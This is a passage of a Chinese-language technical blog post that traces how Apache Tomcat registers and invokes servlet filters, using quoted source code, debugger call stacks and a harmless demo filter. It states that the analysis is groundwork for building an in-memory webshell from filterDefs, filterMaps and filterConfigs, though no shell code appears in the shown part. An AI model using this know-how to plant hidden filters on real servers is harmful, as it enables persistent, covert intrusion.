class="line">doPrivilegedOperation:<span class="number">1411</span>, RMIConnectionImpl (javax.management.remote.rmi)</span><br><span class="line">invoke:<span class="number">832</span>, RMIConnectionImpl (javax.management.remote.rmi)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">dispatch:<span class="number">323</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">568</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">826</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">256</span>:<span class="number">683</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">1966382949</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">25</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">682</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>回到startInternal方法，执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Call ServletContainerInitializers</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;ServletContainerInitializer, Set&lt;Class&lt;?&gt;&gt;&gt; entry : initializers.entrySet()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        entry.getKey().onStartup(entry.getValue(), getServletContext());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">        log.error(sm.getString(<span class="string">&quot;standardContext.sciFail&quot;</span>), e);</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的作用是遍历已注册的ServletContainerInitializer，并依次调用它们的onStartup方法。通过这种方式，可以在Servlet容器启动时执行一些初始化任务，例如注册Servlet、Filter、Listener等。<br>最终来到org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;ApplicationContext的addFilter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName, String filterClass, Filter filter)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="comment">// 参数验证</span></span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 状态检查</span></span><br><span class="line">    <span class="comment">// TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">    checkState(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>);</span><br><span class="line">    <span class="comment">// 查找FilterDef</span></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assume a &#x27;complete&#x27; FilterRegistration is one that has a class and</span></span><br><span class="line">    <span class="comment">// a name</span></span><br><span class="line">    <span class="comment">// 如果查找未成功，创建一个新的FilterDef</span></span><br><span class="line">    <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果FilterDef对象已经具有filterName和filterClass</span></span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp; filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置filterDef属性</span></span><br><span class="line">    <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建了ApplicationFilterRegistration对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该段代码的作用是向应用程序上下文中添加过滤器，并返回一个FilterRegistration.Dynamic对象，用于进一步配置和管理该过滤器。<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">addFilter:<span class="number">774</span>, ApplicationContext (org.apache.catalina.core)</span><br><span class="line">addFilter:<span class="number">761</span>, ApplicationContext (org.apache.catalina.core)</span><br><span class="line">addFilter:<span class="number">434</span>, ApplicationContextFacade (org.apache.catalina.core)</span><br><span class="line">&lt;init&gt;:<span class="number">109</span>, WsServerContainer (org.apache.tomcat.websocket.server)</span><br><span class="line">init:<span class="number">137</span>, WsSci (org.apache.tomcat.websocket.server)</span><br><span class="line">onStartup:<span class="number">49</span>, WsSci (org.apache.tomcat.websocket.server)</span><br><span class="line">startInternal:<span class="number">4929</span>, StandardContext (org.apache.catalina.core)</span><br></pre></td></tr></table></figure>

<p>filterMaps的添加过程，在org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;ApplicationFilterRegistration的addMappingForUrlPatterns方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addMappingForUrlPatterns</span><span class="params">(EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="type">boolean</span> isMatchAfter,</span></span><br><span class="line"><span class="params">        String... urlPatterns)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line"></span><br><span class="line">    filterMap.setFilterName(filterDef.getFilterName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dispatcherTypes != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;</span><br><span class="line">            filterMap.setDispatcher(dispatcherType.name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (urlPatterns != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// % decoded (if necessary) using UTF-8</span></span><br><span class="line">        <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">            filterMap.addURLPattern(urlPattern);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isMatchAfter) &#123;</span><br><span class="line">            context.addFilterMap(filterMap);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            context.addFilterMapBefore(filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// else error?</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">addMappingForUrlPatterns:<span class="number">83</span>, ApplicationFilterRegistration (org.apache.catalina.core)</span><br><span class="line">&lt;init&gt;:<span class="number">116</span>, WsServerContainer (org.apache.tomcat.websocket.server)</span><br><span class="line">init:<span class="number">137</span>, WsSci (org.apache.tomcat.websocket.server)</span><br><span class="line">onStartup:<span class="number">49</span>, WsSci (org.apache.tomcat.websocket.server)</span><br><span class="line">startInternal:<span class="number">4929</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:<span class="number">183</span>, LifecycleBase (org.apache.catalina.util)</span><br></pre></td></tr></table></figure>

<p>经过上面的解析，此时filterDefs、filterMaps中已经有数据了，并且filterMaps是根据filterDefs来的</p>
<p>接着来到startInternal方法，调用filterStart</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Configure and call application filters</span></span><br><span class="line"><span class="keyword">if</span> (ok) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此时filterConfigs中还没有数据，经过filterStart方法后，就有了数据<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterStart:<span class="number">4331</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">startInternal:<span class="number">4965</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:<span class="number">183</span>, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">addChildInternal:<span class="number">683</span>, ContainerBase (org.apache.catalina.core)</span><br></pre></td></tr></table></figure>

<h1 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>创建一个简单的Java Web项目，添加一个Filter，然后在web.xml中配置Filter，启动项目，访问一个Servlet，查看控制台输出的日志，可以看到Filter的init方法和doFilter方法被调用了。另外在停止Tomcat时，也会调用Filter的destroy方法。<br>Filter示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(value = &quot;/hello&quot;, filterName = &quot;hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do filter&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter destory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web.xml配置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filter.HelloFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Filter的init方法和doFilter方法是谁调用的呢？Filter是怎么被调用的呢？</p>
<h2 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h2><p>根据上一节描述的Tomcat配置文件解析过程，在应用程序中动态添加一个filter的过程如下：</p>
<ul>
<li>调用ApplicationContext的addFilter方法创建FilterDef对象</li>
<li>调用StandardContext的filterStart方法得到filterConfigs</li>
<li>调用ApplicationFilterRegistration的addMappingForUrlPatterns生成filterMaps（可以将自定义的filter放在filterMaps中的第一位，有两种方法：a.手动修改filterMaps的顺序  b.调用StandardContext的addFilterMapBefore方法将该filter放入filterMaps第一位）</li>
</ul>
<p>另外，在实现内存马的时候，可以模仿以上函数的代码构建filterDefs、filterMaps、filterConfigs这三个变量</p>
<h2 id="Filter触发流程"><a href="#Filter触发流程" class="headerlink" title="Filter触发流程"></a>Filter触发流程</h2><p>根据Tomcat版本添加Maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.73<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在自定义Filter的doFilter方法中下断点，然后启动Tomcat，访问Servlet，可以看到断点被触发了，查看调用栈，可以看到调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">doFilter:<span class="number">16</span>, HelloFilter (org.example.filter)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>首先在org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;StandardWrapperValve类的invoke方法中，分两步：<br>第一步如下代码构建了一条filterChain</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>

<p>构建好链后，第二步调用filterChain的doFilter方法，如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure>

<p>先分析ApplicationFilterFactory.createFilterChain</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line">    <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">        <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="comment">// Security: Do not recycle</span></span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">            <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                req.setFilterChain(filterChain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Request dispatcher in use</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    filterChain.setServlet(servlet);</span><br><span class="line">    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">    FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line">    <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line">    <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">    <span class="keyword">if</span> (attribute != <span class="literal">null</span>) &#123;</span><br><span class="line">        requestPath = attribute.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) context</span><br><span class="line">                .findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) context</span><br><span class="line">                .findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the completed filter chain</span></span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一：尝试从request中获取filterChain，如果获取不到，就创建一个新的filterChain<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917174456.png"><br>第二：设置servlet，获取filterMaps<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917174833.png"><br>第三：将相关的路径映射过滤器添加到此过滤器链中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917200031.png"><br>filterMap.getFilterName得到的是name，而context.findFilterConfig是根据name找filterConfigs中对应的值<br>进入addFilter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prevent the same filter being added multiple times</span></span><br><span class="line">    <span class="keyword">for</span> (ApplicationFilterConfig filter : filters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (filter == filterConfig) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">        ApplicationFilterConfig[] newFilters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[n + INCREMENT];</span><br><span class="line">        System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">        filters = newFilters;</span><br><span class="line">    &#125;</span><br><span class="line">    filters[n++] = filterConfig;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917201558.png"><br>完成一轮for循环后，继续下一轮，直到所有符合条件的filterMap都添加到filterChain中<br>第四：添加与服务程序名称相匹配的筛选器，即第二个for循环<br>第五：返回完成的filterChain<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917202128.png"></p>
<p>接下来返回StandardWrapperValve.invoke方法，调用filterChain的doFilter方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917202653.png"><br>进入internalDoFilter方法<br>获取filterChain中的第一个filter<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917203145.png"><br>然后调用filter的doFilter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filter.doFilter(request, response, <span class="built_in">this</span>);</span><br></pre></td></tr></table></figure>

<p>进入该filter的doFilter方法就来到了我们写的函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917203356.png"><br><strong>总结</strong></p>
<ul>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的FilterConfig，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ul>
<p><strong>关键</strong><br>这里面存在关键的三个变量：filterMaps、filterConfigs、filterDefs, 它们都从StandardContext中获取<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917204828.png"><br><strong>filterMaps</strong><br>在StandardContext中添加filterMap的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.add(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMapBefore</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.addBefore(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>filterConfigs</strong><br>在StandardContext中添加filterConfig的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">        getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (filterConfigs) &#123;</span><br><span class="line">        filterConfigs.clear();</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, FilterDef&gt; entry : filterDefs.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span 